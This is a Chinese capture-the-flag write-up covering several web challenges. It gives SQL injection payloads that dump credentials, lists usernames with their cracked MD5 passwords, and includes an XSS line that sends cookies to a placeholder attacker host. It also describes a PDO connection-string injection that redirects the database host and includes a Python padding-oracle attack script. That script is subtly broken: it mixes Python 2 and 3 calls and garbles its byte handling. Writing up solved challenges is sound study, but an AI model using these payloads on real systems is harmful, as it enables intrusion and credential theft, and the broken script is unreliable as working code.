### 文本优化

#### 初始登录页面字段猜测
根据初始登录页面的 `name` 属性，我们猜测字段名分别为 `login` 和 `password`。通过以下 SQL 注入语句获取用户名和密码：

1. 获取用户名：
   ```sql
   firstname='union select/*&lastname=*/login/*&position=*/,2,3,4,5,6 /*#&country=*/from users#123&gender=
   ```

2. 获取密码：
   ```sql
   firstname='union select/*&lastname=*/password/*&position=*/,2,3,4,5,6 /*#&country=*/from users#123&gender=
   ```

通过上述查询，我们得到了三个用户名和三个 MD5 加密的密码值。解密后即可使用这些凭据登录并获取 flag。

- 用户名:
  - `ruleradmin`
  - `patrick`
  - `raoul`

- 密码 (MD5 值及对应的明文):
  - `04fc95a5debc7474a84fad9c50a1035d` -> `smart1985`
  - `db6eab0550da4b056d1a33ba2e8ced66` -> `1badgurl`
  - `7ac89e3c1f1a71ee19374d7e8912714b` -> `1badboy`

#### Purple Posse Market
在进入网站后，经过一番研究发现有一个 `contact` 页面可以提交内容，但其他功能似乎无用。题目要求获取管理员的 IBAN 账户，因此推测可能需要通过 XSS 攻击来窃取 cookie 并登录后台。由于输入未被过滤，可以直接执行 JavaScript 代码来获取 cookie。以下是用于请求的 JavaScript 代码示例：

```javascript
$.get("http://你的xss平台?a="+document.cookie, function(data, status){});
```

通过此方法成功获取到 cookie 后，登录后台即可查看管理员的 IBAN 账户，即为 flag。

#### WhyUNoKnock
该题目涉及一个登录页面，输入参数包括 `login`、`password` 和 `group`。初步测试显示前两个参数正常，但修改 `group` 参数会引发 PDOException: 1044。推测可能是表名注入，但多次尝试均不符合 SQL 语法规则。进一步分析表明，输入点可能位于 PDO 连接数据库时的配置部分。通过设置 `group=users;host=test.dns.log:1234;`，观察到 DNS 记录和 TCP 请求，确认了输入点位置。

解决方案有两种：
1. 使用伪造的 MySQL 服务器或抓包替换返回值。
2. 修改 MySQL 配置以跳过认证并记录 SQL 日志，最终选择第二种方案。通过构造相应的 `admins` 数据库并插入一条记录，成功登录并获取 flag。

#### MarkIsFaillingDownDrunk
进入网站后，点击任意链接发现 URL 发生变化，推测为 Padding Oracle 攻击。编写 Python 代码解密密文并获取明文，代码如下：

```python
import requests
import base64
import time

url = 'http://markisfaillingdowndrunk.quals.nuitduhack.com/view/'
N = 16

def inject(param):
    result = requests.get(url + param)
    return result

def xor(a, b):
    return "".join([chr(ord(a[i]) ^ ord(b[i % len(b)])) for i in range(len(a))])

def pad(string, N):
    l = len(string)
    if l != N:
        return string + chr(N - l) * (N - l)

def padding_oracle(N, cipher):
    get = ""
    for i in range(1, N + 1):
        for j in range(0, 256):
            padding = xor(get, chr(i) * (i - 1))
            c = chr(0) * (16 - i) + chr(j) + padding + cipher
            result = inject(c.encode('hex'))
            if result.status_code != 500:
                get = chr(j ^ i) + get
                break
    return get

s = [
    "deadbeefcafedeadbeefcafe04030201b2c7da6ca163321fc0e96e98df20b58389e055de04be2972edc654d2f609d9608bc083bf5f35eba62d7faf73d7ec7fec88743a46bbd5711e9f954f7f54c211a3ef30067df218e84a474ec00dc1789b3c053fd578c86f6e87e080a63c6191289cd4f2e5178882f36097ae40214323b2bde2491de75c6603a708b61f80efc07b2da2d626137891b74c7019b040db51f468a2d6978e726e5c35ad9ce7f1dbc06cba",
    "deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf441aee00f376a598270a8d830ddf58ab489e053dbbfba4b30652f718567777364a07d5b453fb6ab946cc6ce6485f6250d583fbaac9fb0d169de6184a1c1fa0a30",
    "deadbeefcafedeadbeefcafe0403020131fdd089e91025df9510efa46b2085aac738ae5e03daa6495e2e4ee83283282a5be01dd6d817df2c0e69cd613c7da160a6aab9f02d175ac549feb6b674fa6f65",
    "deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02"
]

IV = s[0][:16]
ans = []

for i in range(4):
    c = []
    str1 = bytes.fromhex(s[i])
    for j in range(0, len(str1), N):
        c.append(str1[j:j+N])
    l = len(c)
    p = [""] * l
    for j in range(l-1, 0, -1):
        middle = padding_oracle(N, c[j].hex())
        p[j] = xor(middle, c[j-1].hex())
    ans.append(p)

print(ans)
```

通过解密得到的明文链接指向特定的内容，这表明 `view` 后面直接跟的链接会被读取并进行 Markdown 渲染。接下来的思路是让其访问预先放置的 Markdown 文件，并通过 SSTI 执行命令或读取文件。具体实现细节省略，但核心在于通过 Padding Oracle 伪造明文以控制渲染内容。